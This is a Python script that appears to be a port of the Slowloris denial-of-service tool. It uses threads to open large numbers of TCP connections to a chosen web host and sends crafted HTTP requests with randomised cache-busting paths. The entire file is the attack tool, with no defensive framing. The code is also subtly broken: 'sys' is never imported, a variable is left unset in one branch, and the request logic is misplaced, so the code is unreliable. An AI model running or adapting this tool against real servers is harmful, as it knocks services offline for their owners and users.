import argparse
import random
import socket
import threading
import timeit
import requests

parser = argparse.ArgumentParser()
parser.add_argument("-shost", "-s", type=str, required=False)
parser.add_argument("-dns", "-d", dest="host", type=str, required=False)
parser.add_argument("-httpready", action="store_true", required=False)
parser.add_argument("-num", "-n", dest="connections", type=int, required=False)
parser.add_argument("-cache", "-c", action="store_true", required=False)
parser.add_argument("-port", "-p", type=int, required=False)
parser.add_argument("-https", dest="ssl", required=False)
parser.add_argument("-tcpto", type=int, required=False)
parser.add_argument("-test", action="store_true", required=False)
parser.add_argument("-timeout", type=int, required=False)
parser.add_argument("-version", "-v", action="store_true", required=False)
args = parser.parse_args()
if args.version:
    sys.exit("Version 0.1")
if not args.host:
    print("Usage:\n\n\tpython {} -dns [www.example.com] -options".format(sys.argv[0]))
    print("\n\tType 'pydoc {}' for help with options.\n".format(sys.argv[0]))
    sys.exit()
if not args.port:
    args.port = 80
    print("Defaulting to port 80.")
if not args.tcpto:
    args.tcpto = 5
    print("Defaulting to a 5 second tcp connection timeout.")
if not args.test:
    if not args.timeout:
        args.timeout = 100
        print("Defaulting to a 100 second re-try timeout.")
    if not args.connections:
        args.connections = 1000
        print("Defaulting to 1000 connections.")
failed = 0
packetcount = 0
if args.shost:
    sendhost = args.shost
else:
    sendhost = args.host
if args.httpready:
    method = "POST"
else:
    method = "GET"


def doconnections(num_connections):
    global failed, packetcount
    rand = random.Random()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(args.tcpto)
    for i in range(num_connections):
        if sock.connect_ex((args.host, args.port)) == 0:
            packetcount += 3
        if args.cache:
            rand_string = "?" + str(rand.randint(0, 99999999999999))
        else:
            rand
            primarypayload = "{} /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MS-RTC LM 8)\r\n".format(
                method, rand_string, sendhost
            )
            primarypayload += "Content-Length: 42\r\n"
            primarypayload += "\r\n"
            primarypayload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
            try:
                sock.send(primarypayload.encode())
                packetcount += 1
            except Exception as e:
                failed += 1
                sock.close()
                continue
            try:
                sock.recv(1024)
            except Exception as e:
                failed += 1
                sock.close()
                continue
            sock.close()
    sock.close()


num_threads = args.connections // 50
remainder = args.connections % 50
threads = []
for i in range(num_threads):
    t = threading.Thread(target=doconnections, args=(50,))
    threads.append(t)
    t.start()
if remainder > 0:
    t = threading.Thread(target=doconnections, args=(remainder,))
    threads.append(t)
    t.start()
for t in threads:
    t.join()

print("Completed with {} failed connections.".format(failed))
